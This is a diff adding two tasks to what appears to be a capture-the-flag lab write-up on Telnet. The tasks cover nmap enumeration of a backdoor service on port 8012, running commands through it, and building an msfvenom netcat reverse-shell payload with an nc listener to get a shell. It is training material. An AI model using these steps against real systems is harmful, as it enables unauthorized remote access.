@@ -267,9 +267,166 @@ The user connects to the server by using the Telnet protocol, which means enteri
 
 ## Task 6 - Enumerating Telnet
 
+**Lets Get Started**
+
+Before we begin, make sure to deploy the room and give it some time to boot. Please be aware, this can take up to five minutes so be patient!
+
+**Enumeration**
+
+We've already seen how key enumeration can be in exploiting a misconfigured network service. However, vulnerabilities that could be potentially trivial to exploit don't always jump out at us. For that reason, especially when it comes to enumerating network services, we need to be thorough in our method. 
+
+**Port Scanning**
+
+Let's start out the same way we usually do, a port scan, to find out as much information as we can about the services, applications, structure and operating system of the target machine. Scan the machine with **nmap**.
+
+**Output**
+
+Let's see what's going on on the target server...
+
+### Answer the questions
+
+* How many ports are open on the target machine?
+
+	`1`
+
+	![task6-nmap](./images/task6-nmap.png)
+
+* What port is this?
+
+	`8012`
+
+* This port is unassigned, but still lists the protocol it's using, what protocol is this?
+
+	`tcp`
+
+* Now re-run the nmap scan, without the -p- tag, how many ports show up as open?
+
+	`0`
+
+Here, we see that by assigning telnet to a non-standard port, it is not part of the common ports list, or top 1000 ports, that nmap scans. It's important to try every angle when enumerating, as the information you gather here will inform your exploitation stage.
+
+* Based on the title returned to us, what do we think this port could be used for?
+
+	`a backdoor`
+
+	![task6-nmap-8012](./images/task6-nmap-8012.png)
+
+* Who could it belong to? Gathering possible usernames is an important step in enumeration.
+
+	``
+
+Always keep a note of information you find during your enumeration stage, so you can refer back to it when you move on to try exploits.
 
 ## Task 7 - Exploiting Telnet
 
+**Types of Telnet Exploit**
+
+Telnet, being a protocol, is in and of itself insecure for the reasons we talked about earlier. It lacks encryption, so sends all communication over plaintext, and for the most part has poor access control. There are CVE's for Telnet client and server systems, however, so when exploiting you can check for those on:
+
+* https://www.cvedetails.com/
+* https://cve.mitre.org/
+
+A CVE, short for Common Vulnerabilities and Exposures, is a list of publicly disclosed computer security flaws. When someone refers to a CVE, they usually mean the CVE ID number assigned to a security flaw.
+
+However, you're far more likely to find a misconfiguration in how telnet has been configured or is operating that will allow you to exploit it.
+
+**Method Breakdown**
+
+So, from our enumeration stage, we know:
+
+- There is a poorly hidden telnet service running on this machine
+- The service itself is marked "backdoor"
+- We have possible username of "Skidy" implicated
+
+Using this information, let's try accessing this telnet port, and using that as a foothold to get a full reverse shell on the machine!
+
+**Connecting to Telnet**
+
+You can connect to a telnet server with the following syntax:
+
+	`telnet [ip] [port]`
+
+We're going to need to keep this in mind as we try and exploit this machine.
+
+`What is a Reverse Shell?`
+
+![task7-shell](./images/task7-shell.png)
+
+A **"shell"** can simply be described as a piece of code or program which can be used to gain code or command execution on a device.
+
+A reverse shell is a type of shell in which the target machine communicates back to the attacking machine.
+
+The attacking machine has a listening port, on which it receives the connection, resulting in code or command execution being achieved.
+
+### Answer the questions
+
+Okay, let's try and connect to this telnet port! If you get stuck, have a look at the syntax for connecting outlined above.
+
+* Great! It's an open telnet connection! What welcome message do we receive? 
+
+	`SKIDY'S BACKDOOR.`
+
+* Let's try executing some commands, do we get a return on any input we enter into the telnet session? (Y/N)
+
+	`N`
+
+	![task7-telnet](./images/task7-telnet.png)
+
+Hmm... that's strange. Let's check to see if what we're typing is being executed as a system command. 
+
+Start a tcpdump listener on your local machine.
+
+If using your own machine with the OpenVPN connection, use:	
+
+`sudo tcpdump ip proto \\icmp -i tun0`
+
+![task7-tcpdump](./images/task7-tcpdump.png)
+
+If using the AttackBox, use:
+
+`sudo tcpdump ip proto \\icmp -i ens5`
+
+This starts a tcpdump listener, specifically listening for ICMP traffic, which pings operate on.
+
+* Now, use the command `"ping [local THM ip] -c 1"` through the telnet session to see if we're able to execute system commands. Do we receive any pings? Note, you need to preface this with .RUN (Y/N)
+
+	`Y`
+
+	![task7-tcpdump](./images/task7-tcpdump.png)
+
+Great! This means that we are able to execute system commands AND that we are able to reach our local machine. Now let's have some fun!
+
+We're going to generate a reverse shell payload using msfvenom. This will generate and encode a netcat reverse shell for us. Here's our syntax:
+
+**`"msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R"`**
+
+_-p = payload  
+lhost = our local host IP address (this is your machine's IP address)  
+lport = the port to listen on (this is the port on your machine)  
+R = export the payload in raw format_
+
+* What word does the generated payload start with?
+
+	`mkfifo`
+
+	![task7-msfvenom](./images/task7-msfvenom.png)
+
+
+Perfect. We're nearly there. Now all we need to do is start a netcat listener on our local machine. We do this using:
+
+`"nc -lvp [listening port]"`
+
+* What would the command look like for the listening port we selected in our payload?
+
+	`nc -lvp 4444`
+
+	![task7-nc](./images/task7-nc.png)
+
+Great! Now that's running, we need to copy and paste our msfvenom payload into the telnet session and run it as a command. Hopefully- this will give us a shell on the target machine!
+
+* Success! What is the contents of flag.txt?
+
+	``
 
 ## Task 8 - Understanding FTP
 
